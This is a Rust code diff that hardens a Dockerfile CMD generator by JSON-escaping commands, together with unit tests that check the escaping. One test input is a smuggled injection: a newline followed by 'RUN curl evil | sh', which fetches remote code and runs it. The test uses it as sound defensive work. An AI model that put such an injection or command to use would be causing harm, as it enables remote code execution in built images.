@@ -62,15 +62,39 @@ fn cmd_line(cmd: &str) -> String {
         '$', '`', '&', '|', ';', '<', '>', '(', ')', '{', '}', '*', '?', '~', '!', '#', '=', '\n',
     ];
     if cmd.contains(SHELL_CHARS) {
-        format!("CMD [\"/bin/sh\", \"-c\", \"{cmd}\"]")
+        format!("CMD [\"/bin/sh\", \"-c\", \"{}\"]", json_escape(cmd))
     } else {
         let argv = cmd
             .split_whitespace()
-            .map(|a| format!("\"{a}\""))
+            .map(|a| format!("\"{}\"", json_escape(a)))
             .collect::<Vec<_>>()
             .join(", ");
         format!("CMD [{argv}]")
     }
+}
+
+/// Escape a string for embedding inside a JSON string literal.
+///
+/// No untrusted character (a quote, backslash, newline, or other control
+/// character) can then break out of the `CMD` array or split the Dockerfile
+/// line it sits on.
+fn json_escape(s: &str) -> String {
+    use std::fmt::Write as _;
+    let mut out = String::with_capacity(s.len());
+    for c in s.chars() {
+        match c {
+            '"' => out.push_str("\\\""),
+            '\\' => out.push_str("\\\\"),
+            '\n' => out.push_str("\\n"),
+            '\r' => out.push_str("\\r"),
+            '\t' => out.push_str("\\t"),
+            c if (c as u32) < 0x20 => {
+                let _ = write!(out, "\\u{:04x}", c as u32);
+            }
+            c => out.push(c),
+        }
+    }
+    out
 }
 
 #[cfg(test)]
@@ -142,6 +166,23 @@ mod tests {
             cmd_line("PHX_SERVER=true /app/bin/web start"),
             "CMD [\"/bin/sh\", \"-c\", \"PHX_SERVER=true /app/bin/web start\"]"
         );
+    }
+
+    #[test]
+    fn cmd_line_never_emits_raw_newline() {
+        // a newline in the command must be JSON-escaped, never a real line break
+        // that could split the Dockerfile and inject a following directive
+        let out = cmd_line("uvicorn app --opt ${X}\nRUN curl evil | sh");
+        assert!(!out.contains('\n'), "must stay one line: {out:?}");
+        assert!(out.contains("\\n"), "newline should be escaped: {out}");
+    }
+
+    #[test]
+    fn cmd_line_escapes_embedded_quotes_in_exec_form() {
+        // no shell metacharacter, so exec form; an embedded quote must be escaped
+        // or it would produce invalid JSON / break out of the array
+        let out = cmd_line("run a\"b");
+        assert!(out.contains("a\\\"b"), "embedded quote must be escaped: {out}");
     }
 
     #[test]
